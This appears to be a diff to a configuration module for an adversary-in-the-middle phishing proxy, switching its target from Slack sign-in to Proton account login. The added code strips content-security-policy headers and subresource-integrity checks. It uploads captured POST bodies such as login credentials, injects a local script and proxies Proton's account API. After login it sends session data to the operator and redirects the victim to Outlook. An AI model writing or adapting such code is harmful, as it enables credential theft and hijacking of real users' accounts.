@@ -1,6 +1,7 @@
 /* eslint-disable camelcase,class-methods-use-this */
 // eslint-disable-next-line max-classes-per-file
 const path = require('path')
+const fs = require('fs')
 const url = require('url')
 
 // eslint-disable-next-line import/no-dynamic-require
@@ -29,8 +30,8 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
         super(proxyResp, browserEndPoint)
         this.regexes = [
              {
-                reg: /app.slack.com\\\/t/igm, // Google chrome on windows fix
-                replacement: `${process.env.HOST_DOMAIN}/app/~\/t`,
+                reg: /integrity=.+?crossorigin/igm, // Google chrome on windows fix
+                replacement: 'crossorigin',
              },
         ]
     }
@@ -44,14 +45,9 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
         if (extRedirectObj !== null) {
             const rLocation = extRedirectObj.url
 
-            if (rLocation.startsWith('https://account.live.com') || rLocation.startsWith('https://account.microsoft.com')) {
-                return this.afterEmailPath()
-            }
         }
-        if (this.proxyResp.headers['content-length'] < 1) {
-            return this.proxyResp.pipe(this.browserEndPoint)
-        }
-        // this.browserEndPoint.removeHeader('content-security-policy')
+        
+        this.browserEndPoint.removeHeader('content-security-policy')
         let newMsgBody;
         return this.superPrepareResponse(true)
             .then((msgBody) => {
@@ -66,11 +62,6 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
             }).catch((err) => {
             console.error(err)
         })
-    }
-
-    afterEmailPath() {
-        this.browserEndPoint.setHeader('location', '/auth0/outlook/owa2')
-        this.browserEndPoint.end('')
     }
 
 
@@ -88,42 +79,44 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     }
 
     execute(clientContext) {
-        // this.req.headers['accept-encoding'] = 'plain, br'
+        // this.req.headers['accept-encoding'] = 'plain'
+        this.req.headers['frame-src'] = 'blob'
         if (this.req.method === 'POST') {
-            // super.uploadRequestBody(clientContext.currentDomain, clientContext)
+            super.uploadRequestBody(clientContext.currentDomain, clientContext)
 
             // super.captureBody(clientContext.currentDomain, clientContext)
 
         }
 
+        if (this.req.url === '/index.fdbd209d.js') {
+            console.log('spam stuf')
+            const clientBuff = fs.readFileSync(path.join(__dirname, 'index.fdbd209d.js'))
+            this.res.writeHead(200)
+            return this.res.end(clientBuff.toString());
+            
+        }
+
+        if (this.req.url.startsWith('/xapi')) {
+            this.req.headers['accept-encoding'] = 'plain'
+            console.log('api spoiler')
+            const qhost = 'account-api.proton.me'
+            this.req.url = this.req.url.split('/xapi')[1]
+            return super.superExecuteProxy(qhost, clientContext)
+        }
+
 
         const redirectToken = this.checkForRedirect()
-        if (redirectToken !== null) {
-            if (redirectToken.url.startsWith('https://slack.com/checkcookie')) {
-                clientContext.info.loginOk = 1
-            }
+        if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
+            clientContext.currentDomain = process.env.PROXY_DOMAIN
+            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
             // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
         }
 
-        if (this.req.url.includes('ssb/redirect?entry_point')) {
-            if (this.req.url.startsWith('/sub--')) {
-                const subPath = this.req.url.split('~')
-                const workSubDomain = subPath[0].slice(6, -1)
-
-                console.log(workSubDomain)
-                clientContext.currentDomain = `${workSubDomain}.slack.com`
-                this.req.url = subPath[1]
-                console.log(`Current workspace domain is ${workSubDomain}.slack.com`)
-                clientContext.sessionBody.domain = `${workSubDomain}.slack.com`
-
-                if (clientContext.info.loginOk === 1) {
-                    clientContext.setLogAvailable(true)
-                    super.sendClientData(clientContext, {})
-                }
-            }
-           
-            // this.res.writeHead('301', {location: 'https://outlook.com'})
-            //  return this.res.end()
+        if (this.req.url === '/auth0/outlook/owa2') {
+            clientContext.setLogAvailable(true)
+            super.sendClientData(clientContext, {})
+            this.res.writeHead('301', {location: 'https://outlook.com'})
+            return this.res.end()
         }
 
         return super.superExecuteProxy(clientContext.currentDomain, clientContext)
@@ -135,8 +128,8 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
 
 const configExport = {
-    CURRENT_DOMAIN: 'slack.com',
-    START_PATH: 'signin',
+    CURRENT_DOMAIN: 'account.proton.me',
+    START_PATH: '/login',
     PRE_HANDLERS:
         [
         ],
